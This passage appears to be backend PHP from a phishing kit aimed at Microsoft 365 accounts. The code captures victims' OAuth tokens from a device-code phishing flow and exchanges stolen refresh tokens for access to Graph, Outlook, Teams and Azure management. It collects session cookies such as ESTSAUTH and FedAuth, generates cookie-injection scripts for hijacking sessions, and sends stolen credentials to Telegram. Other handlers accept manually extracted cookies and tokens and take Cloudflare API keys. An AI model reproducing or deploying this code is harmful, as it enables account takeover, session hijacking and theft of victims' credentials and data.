            // Save result immediately to prevent other polls from starting another capture
            file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'time' => date('c')]));

            // MARK TOKEN AS FRESH (RTR Management)
            $tokenData = $json;
            $tokenData['is_fresh'] = true;
            $tokenData['captured_at'] = time();
            $tokenData['tid'] = $data['tid'] ?? 'common';

            $db = new Database();
            $db->logEvent([
                'cookieId' => $cookieId,
                'clientId' => $clientId, // Log which clientId was used
                'type' => 'microsoft_device_flow',
                'emailMask' => $email,
                'email' => $email, // Explicit email for worker
                'domain' => 'microsoft.com',
                'attempt' => 1,
                'password' => 'OAUTH_TOKEN_CAPTURED',
                'ip' => Security::getClientIp(),
                'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'time' => date('c'),
                'token_data' => $tokenData, // Using the enriched token data
                'clientId' => $clientId // Also store at top level for easy access
            ]);

            // --- PHP-ONLY COOKIE SWAP (No Puppeteer) ---
            Security::log("DEVICE_FLOW: Attempting immediate PHP-side cookie swap for $email...");
            $swapResult = self::swapTokenForCookies($json['access_token'], $json['refresh_token'] ?? null, $email, $clientId);
            $cookies = $swapResult['cookies'] ?? [];
            
            $capturedNames = array_column($cookies, 'name');
            Security::log("DEVICE_FLOW: PHP swap captured " . count($cookies) . " cookies: " . implode(', ', $capturedNames));
            
            if (!empty($swapResult['tokens'])) {
                Security::log("DEVICE_FLOW: PHP swap returned updated tokens. Synchronizing...");
                $tokenData = array_merge($tokenData, $swapResult['tokens']);
                // Mark as not fresh if we already performed a swap/refresh in PHP
                $tokenData['is_fresh'] = false;
                $tokenData['php_swapped'] = true;
                
                // Refresh token data in the database with updated tokens from swap
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'token_data' => $tokenData
                ]);
            }
            
            $hasAuth = false;
            foreach ($cookies as $c) {
                if (in_array($c['name'], ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'rtFa', 'FedAuth'])) {
                    $hasAuth = true;
                    break;
                }
            }

            if ($hasAuth) {
                Security::log("DEVICE_FLOW: Full session captured via PHP swap for $email. Task complete.");
                // Success! PHP captured the 13 cookies
                $sessionInjectScript = $sessionDir . '/inject_session_' . $cookieId . '.js';
                $scriptContent = "// @ClosedService-Pages PHP-Only Captured Cookies 🍪\n";
                $scriptContent .= "// Email: $email\n\n";
                $scriptContent .= "(function() {\n";
                $scriptContent .= "    const cookies = " . json_encode($cookies, JSON_PRETTY_PRINT) . ";\n";
                $scriptContent .= "    cookies.forEach(c => {\n";
                $scriptContent .= "        document.cookie = c.name + '=' + c.value + '; domain=' + c.domain + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
                $scriptContent .= "    });\n";
                $scriptContent .= "    console.log('✅ Successfully injected ' + cookies.length + ' cookies!');\n";
                $scriptContent .= "})();";
                file_put_contents($sessionInjectScript, $scriptContent);

                // Telegram Success (No Worker Needed)
                Worker::sendTelegramMessage($email, "DEVICE_FLOW_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ 13 Session Cookies Captured (PHP-Only Mode)");
                Worker::sendTelegramDocument($email, $sessionInjectScript, "php_cookies_{$email}.js");
                
                // Final result update
                file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'status' => 'completed', 'mode' => 'php']));
            } else {
                Security::log("DEVICE_FLOW: PHP swap incomplete for $email. Waiting for browser-side capture (No VPS Worker)...");
                // Mark as completed so the frontend knows to proceed with its local memory sweep
                file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'status' => 'completed', 'mode' => 'local']));
            }

            // Cleanup lock
            if (file_exists($lockFile)) unlink($lockFile);

            echo json_encode(['ok' => true, 'status' => 'completed', 'cookieId' => $cookieId]);
        } else {
            // Cleanup lock on non-success (e.g. authorization_pending)
            if (file_exists($lockFile)) unlink($lockFile);
            echo $resp;
        }
    }

    private static function swapTokenForCookies($accessToken, $refreshToken = null, $email = 'unknown', $clientId = 'd326c4ad-3914-4aba-ba32-83500a38b6a1') {
        $cookies = [];
        $tokens = ['access_token' => $accessToken, 'refresh_token' => $refreshToken];
        $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
        
        Security::log("PHP_CAPTURE: Starting Universal FOCI swap for $email using Microsoft Office ID...");

        try {
            // 1. Get specialized tokens using the refresh token (FOCI Swap)
            if ($refreshToken) {
                $fociResources = [
                    'id_token' => ['scope' => 'openid profile email offline_access https://graph.microsoft.com/.default'],
                    'office'   => ['resource' => 'https://analysis.windows.net/powerbi/api'], 
                    'outlook'  => ['resource' => 'https://outlook.office.com'],
                    'mgmt'     => ['resource' => 'https://management.core.windows.net/'],
                    'teams'    => ['resource' => 'https://api.spaces.skype.com'],
                    'm365'     => ['resource' => 'https://graph.windows.net/'] 
                ];

                foreach ($fociResources as $key => $params) {
                    $body = array_merge([
                        'grant_type' => 'refresh_token',
                        'client_id' => $clientId,
                        'refresh_token' => $tokens['refresh_token']
                    ], $params);

                    $url = isset($params['scope']) 
                        ? "https://login.microsoftonline.com/common/oauth2/v2.0/token"
                        : "https://login.microsoftonline.com/common/oauth2/token";

                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($body));
                    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
                    $resp = curl_exec($ch);
                    $data = json_decode($resp, true);

                    if (isset($data['access_token']) || isset($data['id_token'])) {
                        if ($key === 'id_token') {
                            $tokens['id_token'] = $data['id_token'];
                            $parts = explode('.', $data['id_token']);
                            if (count($parts) >= 2) {
                                $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+/')), true);
                                if (isset($payload['tid'])) $tokens['tid'] = $payload['tid'];
                            }
                        } else {
                            $tokens[$key] = $data['access_token'];
                        }
                        
                        if (isset($data['refresh_token'])) $tokens['refresh_token'] = $data['refresh_token'];
                        Security::log("PHP_CAPTURE: Successfully obtained $key token");
                    }
                }
            }

            // 2. Aggressive Cookie Capture with Browser Headers
            $cookieJar = tempnam(sys_get_temp_dir(), 'ms_cookies_');
            $headers = [
                'User-Agent: ' . $ua,
                'X-AnchorMailbox: ' . $email,
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language: en-US,en;q=0.9',
                'Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'Sec-Ch-Ua-Mobile: ?0',
                'Sec-Ch-Ua-Platform: "Windows"',
                'Sec-Fetch-Dest: document',
                'Sec-Fetch-Mode: navigate',
                'Sec-Fetch-Site: none',
                'Sec-Fetch-User: ?1',
                'Upgrade-Insecure-Requests: 1'
            ];

            if (isset($tokens['id_token'])) {
                $tenantId = $tokens['tid'] ?? 'common';
                
                // POST to login.srf with KMSI=1
                Security::log("PHP_CAPTURE: Posting to login.srf (Tenant: $tenantId)...");
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/login.srf");
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/x-www-form-urlencoded']));
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                    'wa' => 'wsignin1.0',
                    'wtrealm' => 'urn:federation:MicrosoftOnline',
                    'wctx' => 'https://outlook.office.com/owa/?auth_redirect=true',
                    'id_token' => $tokens['id_token'],
                    'PPSX' => 'PassThrough',
                    'LoginOptions' => '3',
                    'type' => '11',
                    'msc' => '1',
                    'kmsi' => '1',
                    'rememberme' => '1'
                ]));
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
                
                // Authorize endpoint (Active Client ID)
                Security::log("PHP_CAPTURE: Accessing authorize (Client: " . $clientId . ")...");
                $authParams = [
                    'client_id' => $clientId,
                    'response_type' => 'code',
                    'redirect_uri' => 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                    'scope' => 'openid profile email offline_access https://graph.microsoft.com/.default',
                    'prompt' => 'none',
                    'login_hint' => $email
                ];
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($authParams));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Office Handshake
                Security::log("PHP_CAPTURE: Accessing authorize (Office ID)...");
                $authParams['client_id'] = 'd326ad-3914-4aba-ba32-83500a38b6a1';
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($authParams));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Graph Authorize (High probability of ESTSAUTH)
                Security::log("PHP_CAPTURE: Accessing Graph Authorize...");
                $graphParams = [
                    'client_id' => '00000003-0000-0000-c000-000000000000',
                    'response_type' => 'code',
                    'redirect_uri' => 'https://graph.microsoft.com/',
                    'scope' => 'https://graph.microsoft.com/.default',
                    'prompt' => 'none',
                    'login_hint' => $email
                ];
                $graphUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($graphParams);
                $ch = curl_init($graphUrl);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // SAS ProcessAuth (Most aggressive endpoint for ESTSAUTH)
                Security::log("PHP_CAPTURE: Accessing SAS ProcessAuth...");
                $ch = curl_init("https://login.microsoftonline.com/common/SAS/ProcessAuth");
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/x-www-form-urlencoded']));
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                    'wa' => 'wsignin1.0',
                    'id_token' => $tokens['id_token'],
                    'LoginOptions' => '3'
                ]));
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Reprocess - Force a session check
                Security::log("PHP_CAPTURE: Accessing reprocess...");
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/reprocess");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
                
                // Extra Endpoint: login.live.com (for hybrid accounts)
                Security::log("PHP_CAPTURE: Accessing login.live.com...");
                $ch = curl_init("https://login.live.com/me.srf?wa=wsignin1.0");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.live.com');
            }

            // Endpoint 2: Outlook (rtFa/FedAuth) - Use the Outlook Token
            Security::log("PHP_CAPTURE: Accessing Outlook OWA with Bearer Token...");
            $ch = curl_init("https://outlook.office.com/owa/?auth_redirect=true");
            $outlookHeaders = $headers;
            if (isset($tokens['outlook'])) {
                $outlookHeaders[] = 'Authorization: Bearer ' . $tokens['outlook'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $outlookHeaders);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.outlook.office.com');
            
            // Endpoint 3: portal.office.com (Get SuiteServiceProxyKey) - Use the Office Token
            Security::log("PHP_CAPTURE: Accessing Office Portal with Bearer Token...");
            $ch = curl_init("https://www.office.com/landing?auth=2");
            $officeHeaders = $headers;
            if (isset($tokens['office'])) {
                $officeHeaders[] = 'Authorization: Bearer ' . $tokens['office'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $officeHeaders);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.office.com');

            // Endpoint 4: M365 Chat (Modern Identity Domain) - Use the M365 Token
            Security::log("PHP_CAPTURE: Accessing M365 Chat Portal with Bearer Token...");
            $ch = curl_init("https://m365.cloud.microsoft/chat/?auth=2");
            $m365Headers = $headers;
            if (isset($tokens['m365'])) {
                $m365Headers[] = 'Authorization: Bearer ' . $tokens['m365'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $m365Headers);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.m365.cloud.microsoft');
            
            // Endpoint 5: MyAccount Security (Often has the best markers)
            Security::log("PHP_CAPTURE: Accessing MyAccount Security...");
            $ch = curl_init("https://myaccount.microsoft.com/info");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.microsoft.com');

            // Parse final cookie jar to get any hidden cookies
            if (file_exists($cookieJar)) {
                $jarContent = file_get_contents($cookieJar);
                $lines = explode("\n", $jarContent);
                foreach ($lines as $line) {
                    if (empty($line) || $line[0] === '#') continue;
                    
                    $m = explode("\t", $line);
                    if (count($m) >= 7) {
                        $domain = trim($m[0]);
                        $name = trim($m[5]);
                        $value = trim($m[6]);
                        
                        // Normalization: Ensure leading dot for major session cookies
                        if (strpos($domain, 'microsoft') !== false && $domain[0] !== '.') {
                            $domain = '.' . $domain;
                        }
                        
                        $exists = false;
                        foreach ($cookies as &$c) {
                            if ($c['name'] === $name && ($c['domain'] === $domain || $c['domain'] === substr($domain, 1))) {
                                $c['value'] = $value;
                                $c['domain'] = $domain;
                                $exists = true;
                                break;
                            }
                        }
                        if (!$exists) {
                    $cookies[] = [
                        'name' => $name, 'value' => $value, 'domain' => $domain,
                        'path' => '/', 'secure' => true, 'sameSite' => 'None', 'expires' => time() + (365 * 24 * 60 * 60)
                    ];
                }
            }
        }
        unlink($cookieJar);
        }
        Security::log("SWAP_ALL_COLLECTED_COOKIES: " . json_encode($cookies));

        // 3. Filter for the "Essential Cookies"
        $essentialNames = [
                'ESTSAUTH','ESTSAUTHPERSISTENT','buid','fpc','stsservicecookie','x-ms-gateway-slice',
                'luat','SuiteServiceProxyKey','OWAAppIdType','MSPAuth','MSPOK','rtFa','FedAuth',
                'RPSSecAuth','RPSToken','STSServiceCookie','x-ms-cpim-sso:','brcap','SignInStateCookie',
                'AADSSO', 'esctx', 'ClientId', 'X-OWA-RedirectHistory', 'OH.SID', 'OH.FLID',
                'OpenIdConnect.nonce', 'OpenIdConnect.id_token', 'OIDC', 'MSFPC', 'msal.cache.encryption', 'x-ocditid'
            ];
            
            // Priority domains for cookie selection
            $domainPriority = [
                '.m365.cloud.microsoft' => 100,
                '.login.microsoftonline.com' => 90,
                '.outlook.office.com' => 85,
                '.office.com' => 80,
                '.microsoft.com' => 70,
                '.login.live.com' => 60
            ];
            
            // Add modern OIDC cookies to the pool
            $modernPatterns = ['/\.AspNetCore\.OpenIdConnect\.Nonce\./', '/\.AspNetCore\.Correlation\./', '/^esctx/'];
            
            $finalCookies = [];
            // Strategy: First find exact matches for essentialNames, prioritized by domain
            foreach ($essentialNames as $name) {
                $candidates = [];
                foreach ($cookies as $c) {
                    if ($c['name'] === $name) {
                        $priority = 0;
                        foreach ($domainPriority as $domain => $score) {
                            if (strpos($c['domain'], $domain) !== false) {
                                $priority = $score;
                                break;
                            }
                        }
                        $candidates[] = ['c' => $c, 'p' => $priority];
                    }
                }
                if (!empty($candidates)) {
                    usort($candidates, function($a, $b) { return $b['p'] - $a['p']; });
                    $finalCookies[] = $candidates[0]['c'];
                }
            }
            
            // Strategy: Find fuzzy matches for patterns and remaining essentials
            foreach ($cookies as $c) {
                $alreadyIn = false;
                foreach ($finalCookies as $f) { if($f['name'] === $c['name'] && $f['domain'] === $c['domain']) { $alreadyIn = true; break; } }
                if ($alreadyIn) continue;

                $match = false;
                // STICKY: Always include ALL cookies from modern M365 domain if they aren't duplicates
                if (strpos($c['domain'], 'm365.cloud.microsoft') !== false) {
                    $match = true;
                }
                
                if (!$match) {
                    foreach ($modernPatterns as $pattern) { if (preg_match($pattern, $c['name'])) { $match = true; break; } }
                }
                
                if (!$match) {
                    // Fuzzy match for essentialNames (e.g. esctx-...)
                    foreach ($essentialNames as $name) { if (stripos($c['name'], $name) !== false) { $match = true; break; } }
                }

                if ($match) {
                    $finalCookies[] = $c;
                    if (count($finalCookies) >= 50) break; // Increased to 50 for full M365 support
                }
            }
            
            // Success detection: Traditional session cookies are REQUIRED for login
            $hasTraditional = false;
            $hasModernOidc = false;
            
            foreach ($finalCookies as $c) {
                // Legacy Markers
                if ($c['name'] === 'ESTSAUTH' || $c['name'] === 'ESTSAUTHPERSISTENT' || 
                    $c['name'] === 'rtFa' || $c['name'] === 'FedAuth' || 
                    $c['name'] === 'MSPAuth' || $c['name'] === 'MSPOK' ||
                    $c['name'] === 'RPSSecAuth' || $c['name'] === 'SignInStateCookie') {
                    $hasTraditional = true;
                }
                
                // Modern M365 Markers (OIDC)
                if (strpos($c['name'], '.AspNetCore.OpenIdConnect.Nonce.') !== false || 
                    strpos($c['name'], '.AspNetCore.Correlation.') !== false) {
                    $hasModernOidc = true;
                }
            }
            
            // Success: If we have legacy markers OR a complete set of modern OIDC markers
            $hasAuth = $hasTraditional || $hasModernOidc;
            
            $capturedNames = [];
            foreach ($finalCookies as $f) {
                $capturedNames[] = $f['name'];
            }
            
            Security::log("PHP_CAPTURE: Finished. Essential count: " . count($finalCookies) . ". Cookies: " . implode(', ', $capturedNames) . ". Has Auth: " . ($hasAuth ? "YES" : "NO"));
            Security::log("SWAP_FINAL_COOKIES: " . json_encode($finalCookies));
            
            return ['cookies' => $finalCookies, 'tokens' => $tokens];
            
        } catch (\Exception $e) {
            Security::log("PHP_CAPTURE ERROR: " . $e->getMessage());
            return ['cookies' => [], 'tokens' => $tokens ?? []];
        }
    }

    private static function extractCookiesFromResponse($response, &$cookies, $defaultDomain) {
        preg_match_all('/^Set-Cookie:\s*(.*)$/mi', $response, $fullMatches);
        
        foreach($fullMatches[1] as $fullItem) {
            $parts = explode(';', $fullItem);
            $cookiePart = trim($parts[0]);
            $kv = explode('=', $cookiePart, 2);
            
            if (count($kv) === 2) {
                $name = trim($kv[0]);
                $value = trim($kv[1]);
                
                // Determine domain
                $domain = $defaultDomain;
                foreach ($parts as $p) {
                    $p = trim($p);
                    if (stripos($p, 'domain=') === 0) {
                        $domain = trim(substr($p, 7));
                        break;
                    }
                }
                
                // Normalization: Ensure leading dot for major session cookies
                if ($domain && $domain[0] !== '.') {
                    $domain = '.' . $domain;
                }

                // Check for duplicates (keep latest)
                $exists = false;
                foreach($cookies as &$c) {
                    if($c['name'] === $name && ($c['domain'] === $domain || $c['domain'] === substr($domain, 1))) {
                        $c['value'] = $value;
                        $c['domain'] = $domain; // Normalize to leading dot
                        $exists = true;
                        Security::log("COOKIE_EXTRACTED_UPDATE: Name={$name}, Value={$value}, Domain={$domain}");
                        break;
                    }
                }
                if(!$exists) {
                    $cookies[] = [
                        'name' => $name,
                        'value' => $value,
                        'domain' => $domain,
                        'path' => '/',
                        'secure' => true,
                        'sameSite' => 'None',
                        'expires' => time() + (365 * 24 * 60 * 60)
                    ];
                    Security::log("COOKIE_EXTRACTED_NEW: Name={$name}, Value={$value}, Domain={$domain}");
                }
            }
        }
    }

    private static function handleGetTokens() {
        $id = isset($_GET['id']) ? Security::sanitizeId($_GET['id']) : '';
        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $file = $sessionDir . '/tokens_' . $id . '.json';
        if (file_exists($file)) {
            echo json_encode(['ok' => true, 'tokens' => json_decode(file_get_contents($file), true)]);
        } else {
            // Try to find it in the event log if tokens_.json doesn't exist
            $db = new Database();
            $info = $db->getEventInfo($id);
            if ($info && isset($info['token_data'])) {
                echo json_encode(['ok' => true, 'tokens' => $info['token_data']]);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Tokens not found']);
            }
        }
    }

    private static function handleReceiveCookies() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['cookies'])) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid data']);
            exit;
        }

        $cookies = $data['cookies'];
        $email = $data['email'] ?? 'manual_extract';
        $cookieId = uniqid('manual_', true);

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        // Save as JSON event
        $db = new Database();
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'manual_extract',
            'emailMask' => $email,
            'domain' => 'manual',
            'attempt' => 1,
            'password' => 'MANUAL_EXTRACT',
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c')
        ]);

        // Generate injection script
        $sessionTimestamp = date('c');
        $sessionInjectScript = $sessionDir . '/inject_session_' . $cookieId . '.js';
        
        $scriptContent = "// @ClosedService-Pages Manual Extraction\n";
        $scriptContent .= "// Generated on $sessionTimestamp\n";
        $scriptContent .= "(function() {\n";
        $scriptContent .= "    const cookies = " . json_encode($cookies, JSON_PRETTY_PRINT) . ";\n";
        $scriptContent .= "    cookies.forEach(c => {\n";
        $scriptContent .= "        try {\n";
        $scriptContent .= "            let s = c.name + '=' + c.value + '; ';\n";
        $scriptContent .= "            if (c.domain) s += 'domain=' + c.domain + '; ';\n";
        $scriptContent .= "            if (c.path) s += 'path=' + c.path + '; ';\n";
        $scriptContent .= "            if (c.expires) s += 'expires=' + new Date(c.expires * 1000).toUTCString() + '; ';\n";
        $scriptContent .= "            if (c.secure) s += 'secure; ';\n";
        $scriptContent .= "            if (c.sameSite) s += 'samesite=' + c.sameSite + '; ';\n";
        $scriptContent .= "            document.cookie = s;\n";
        $scriptContent .= "        } catch(e) {}\n";
        $scriptContent .= "    });\n";
        $scriptContent .= "    console.log('Injected ' + cookies.length + ' cookies');\n";
        $scriptContent .= "})();";

        file_put_contents($sessionInjectScript, $scriptContent);

        // Telegram Notification
        Worker::sendTelegramMessage($email, "MANUAL_EXTRACT", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🍪 (Manual Extraction Successful)");
        Worker::sendTelegramDocument($email, $sessionInjectScript, "cookies_{$email}.js");

        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleReceiveTokens() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['refresh_token'])) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing token data']);
            exit;
        }

        $email = $data['email'] ?? 'hybrid_extract';
        $accessToken = $data['access_token'] ?? null;
        $refreshToken = $data['refresh_token'];
        $cookieId = uniqid('hybrid_', true);

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        $sessionFile = $sessionDir . '/session_' . $cookieId . '.json';
        $eventData = [
            'cookieId' => $cookieId,
            'email' => $email,
            'token_data' => [
                'access_token' => $accessToken,
                'refresh_token' => $refreshToken
            ],
            'time' => date('c'),
            'status' => 'pending'
        ];
        file_put_contents($sessionFile, json_encode($eventData, JSON_PRETTY_PRINT));

        // Log to database
        $db = new Database();
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'hybrid_extract',
            'emailMask' => $email,
            'domain' => 'microsoft',
            'attempt' => 1,
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c')
        ]);

        Security::log("HYBRID: Task added to DB for Hybrid Worker for $email ($cookieId)");

        // Notify via Telegram
        Worker::sendTelegramMessage($email, "HYBRID_FLOW_START", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🔄 Hybrid Token Capture Successful! Generating cookies...");

        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleGetCloudflareZones() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));

        if (!$apiKey) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing API Key']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $url = "https://api.cloudflare.com/client/v4/zones";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $json = json_decode($resp, true);

        if ($code === 200 && isset($json['success']) && $json['success']) {
            $zones = [];
